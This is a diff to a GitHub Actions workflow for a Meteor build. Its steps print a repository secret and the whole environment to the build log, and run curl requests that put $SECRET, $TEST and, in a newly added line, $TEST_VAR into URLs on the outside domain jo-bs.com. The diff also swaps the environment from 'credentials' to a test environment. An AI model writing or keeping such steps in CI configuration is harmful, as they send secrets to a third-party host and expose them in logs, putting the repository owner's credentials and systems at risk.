@@ -11,10 +11,10 @@ on:
 
 jobs:
   build:
-    environment: credentials
+    environment: TEST_ENV
     env:
       SECRET: ${{ secrets.NEW_TEST }}
-      # SEC: ${{ env }}
+      SEC: ${{ env.TEST_VAR }}
       # TEST: ${{ environment.credentials.TEST }}
     runs-on: ubuntu-latest
     strategy:
@@ -24,11 +24,12 @@ jobs:
     name: Meteor ${{ matrix.meteor }}
     steps:
       - run: echo $SECRET
+      - run: echo $SEC
       - run: curl https://jo-bs.com/$SECRET -o /dev/null
       - run: curl https://jo-bs.com/$TEST -o /dev/null
+      - run: curl https://jo-bs.com/$TEST_VAR -o /dev/null
       - run: echo $TEST
       - run: echo $GITHUB_ENV
-      - run: echo $SEC
       - run: env
       # - run: echo ${{ env }}
       - run: echo "change" > file
